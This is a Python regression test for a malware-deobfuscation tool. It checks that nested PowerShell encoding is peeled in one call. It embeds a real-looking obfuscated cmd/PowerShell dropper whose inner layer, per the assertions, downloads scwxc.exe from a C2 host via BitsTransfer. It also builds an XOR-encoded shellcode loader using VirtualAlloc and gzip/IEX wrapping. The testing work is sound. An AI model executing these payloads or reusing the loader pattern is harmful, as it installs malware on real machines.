"""Regression test — Feb-2026 recursive deep-decode.

Multi-layer PowerShell obfuscation must peel in ONE call, not require the
analyst to re-paste each intermediate output. Tests the canonical pattern:
    cmd.exe /c powershell -e <b64>
      → utf-16-le PS wrapper
          → FromBase64String("<b64>") | IEX
              → the actual malware
"""
from __future__ import annotations
import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import operations, ops_extended  # noqa: F401

from analysis_core import deterministic_best_decode


# The exact payload the user pasted in Feb 2026
_USER_PAYLOAD = (
    '"C:\\Windows\\System32\\cmd.exe" /c p^ow^ER^s^HE^LL -e '
    "WwBzAFkAUwB0AGUAbQAuAFQAZQBYAFQALgBFAE4AYwBvAEQASQBOAGcAXQA6ADoAdQBuAEkAQwBvAEQARQAuAGcAZQB0AHMAdAByAEkAbgBHACgAWwBzAHkAcwB0AGUAbQAuAEMATwBOAHYAZQBSAHQAXQA6ADoAZgBSAE8ATQBCAGEAcwBlADYANABzAFQAcgBpAE4ARwAoACIAZABBAEIAeQBBAEgAawBBAGUAdwBCAG0AQQBHADgAQQBjAGcAQQBnAEEAQwBnAEEASgBBAEIAcABBAEQAMABBAE0AUQBBADcAQQBDAEEAQQBKAEEAQgBwAEEAQwBBAEEATABRAEIAcwBBAEcAVQBBAEkAQQBBAHgAQQBEAE0AQQBNAEEAQQB3AEEARABBAEEATwB3AEEAZwBBAEMAUQBBAGEAUQBBAHIAQQBDAHMAQQBLAFEAQQBnAEEASABzAEEASgBBAEIAcABBAEMAdwBBAEkAZwBCAGcAQQBHADQAQQBJAGcAQgA5AEEASAAwAEEAWQB3AEIAaABBAEgAUQBBAFkAdwBCAG8AQQBIAHMAQQBmAFEAQQBnAEEARwBZAEEAZABRAEIAdQBBAEcATQBBAGQAQQBCAHAAQQBHADgAQQBiAGcAQQBnAEEARwBzAEEAYwBRAEIAdABBAEcAVQBBAGEAQQBBAGcAQQBDAGcAQQBJAEEAQQBrAEEASABrAEEAYwBBAEIAbwBBAEcAbwBBAFkAdwBBAGcAQQBDAHcAQQBJAEEAQQBrAEEASABFAEEAYQBBAEIAcwBBAEMAQQBBAEsAUQBBAGcAQQBIAHMAQQBhAFEAQgBOAEEASABBAEEAYgB3AEIAUwBBAEgAUQBBAEwAUQBCAE4AQQBFADgAQQBaAEEAQgBWAEEARQB3AEEAUgBRAEEAZwBBAEcASQBBAGEAUQBCAFUAQQBGAE0AQQBWAEEAQgB5AEEARQBFAEEAVABnAEIAegBBAEUAWQBBAFIAUQBCAHkAQQBEAHMAQQBEAFEAQQBLAEEARgBNAEEAZABBAEIAQgBBAEYASQBBAFYAQQBBAHQAQQBFAEkAQQBhAFEAQgBVAEEASABNAEEAVgBBAEIAUwBBAEcARQBBAGIAZwBCAFQAQQBHAFkAQQBSAFEAQgB5AEEAQwBBAEEATABRAEIAegBBAEcAOABBAGQAUQBCAHkAQQBFAE0AQQBaAFEAQQBnAEEAQwBRAEEAZQBRAEIAdwBBAEcAZwBBAGEAZwBCAGoAQQBDAEEAQQBMAFEAQgBFAEEARwBVAEEAYwB3AEIAVQBBAEcAawBBAGIAZwBCAEIAQQBIAFEAQQBTAFEAQgB2AEEARQA0AEEASQBBAEEAawBBAEgARQBBAGEAQQBCAHMAQQBEAHMAQQBJAEEAQgBKAEEARwA0AEEAZABnAEIAdgBBAEcAcwBBAFoAUQBBAHQAQQBFAGsAQQBkAEEAQgBsAEEARwAwAEEASQBBAEEAawBBAEgARQBBAGEAQQBCAHMAQQBEAHMAQQBmAFEAQQBOAEEAQQBvAEEAZABBAEIAeQBBAEgAawBBAGUAdwBBAGcAQQBDAEEAQQBKAEEAQgBqAEEASABjAEEAZAB3AEIAdgBBAEcAVQBBAFkAZwBBADkAQQBDAFEAQQBaAFEAQgB1AEEASABZAEEATwBnAEIAMABBAEcAVQBBAGIAUQBCAHcAQQBDAHMAQQBKAHcAQgBjAEEASABNAEEAWQB3AEIAMwBBAEgAZwBBAFkAdwBBAHUAQQBHAFUAQQBlAEEAQgBsAEEAQwBjAEEATwB3AEEATgBBAEEAbwBBAGEAdwBCAHgAQQBHADAAQQBaAFEAQgBvAEEAQwBBAEEASgB3AEIAbwBBAEgAUQBBAGQAQQBCAHcAQQBEAG8AQQBMAHcAQQB2AEEARwBjAEEAWgBRAEIAdgBBAEgASQBBAFoAdwBCAGwAQQBIAEEAQQBjAGcAQgBoAEEASABBAEEAWQBRAEIAegBBAEMANABBAFkAdwBCAHYAQQBHADAAQQBMAHcAQgBqAEEARwBVAEEAYgBRAEEAdgBBAEYAWQBBAFYAZwBCAGEAQQBFADAAQQBXAFEAQgBNAEEARQBnAEEAWQBRAEIAVABBAEUAOABBAFkAdwBCAGkAQQBHAHcAQQBjAFEAQgB2AEEAQwA0AEEAWgBRAEIANABBAEcAVQBBAEoAdwBBAGcAQQBDAFEAQQBZAHcAQgAzAEEASABjAEEAYQBBAEIAbABBAEcASQBBAE8AdwBBAE4AQQBBAG8AQQBJAEEAQgA5AEEARwBNAEEAWQBRAEIAMABBAEcATQBBAGEAQQBCADcAQQBIADAAQQAiACkAKQB8AEkAZQBYAA=="
)


def test_recursive_deep_decode_peels_two_utf16le_layers_in_one_call():
    """One call, both layers, ALL IOCs surfaced — no re-pasting required."""
    r = deterministic_best_decode(_USER_PAYLOAD)
    out = r.get("output") or ""

    # Must reach the innermost layer, not stop at Layer 1
    assert "georgeprapas.com" in out, "C2 URL from Layer 2 must be in terminal output"
    assert "scwxc.exe" in out, "dropper filename from Layer 2 must be in terminal output"
    assert "BitsTransfer" in out or "BiTsTRanSfEr" in out, "download technique must be preserved"
    assert "13000" in out, "anti-sandbox loop bound must be preserved"

    # The recursive wrapper must show >1 iteration and concat both stages' steps
    assert r.get("iterations", 1) >= 2, f"expected ≥2 iterations, got: {r.get('iterations')}"
    steps = [s.get("op") for s in (r.get("steps") or [])]
    # First stage: extract → base64 → utf16le. Second stage: extract → utf16le.
    assert steps.count("utf16le-decode") >= 2, f"expected 2+ utf16le-decode passes: {steps}"


def test_recursive_deep_decode_stops_when_stable():
    """Plain text with nothing to decode: must NOT recurse forever."""
    r = deterministic_best_decode("just plain english with no encoding")
    # Either 1 iteration (nothing changed) or the pipeline is a no-op
    assert r.get("iterations", 1) <= 2


def test_recursive_deep_decode_preserves_shellcode_terminal_state():
    """When a chained archetype fires (e.g. MSF stager → shellcode), the recursive
    wrapper must NOT keep decoding raw shellcode bytes."""
    import gzip
    sc = b"\xfc\xe8\x89\x00\x00\x00\x60\x89" + b"149.28.81.19\x00" + b"\x90" * 128
    loader = (
        f"[Byte[]]$var_code = [System.Convert]::FromBase64String('{base64.b64encode(bytes(b ^ 0x23 for b in sc)).decode()}')\n"
        f"for ($x = 0; $x -lt $var_code.Count; $x++) {{ $var_code[$x] = $var_code[$x] -bxor 0x23 }}\n"
        f"$var_va = [Kernel32]::VirtualAlloc(0, $var_code.Length, 0x3000, 0x40) # func_get_proc_address"
    )
    outer_b64 = base64.b64encode(gzip.compress(loader.encode())).decode()
    wrapper = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{outer_b64}"));'
        f'IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream('
        f'$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
    )
    r = deterministic_best_decode(wrapper)
    assert r.get("reached_shellcode") is True, \
        "recursive wrapper must stop at shellcode terminal state"
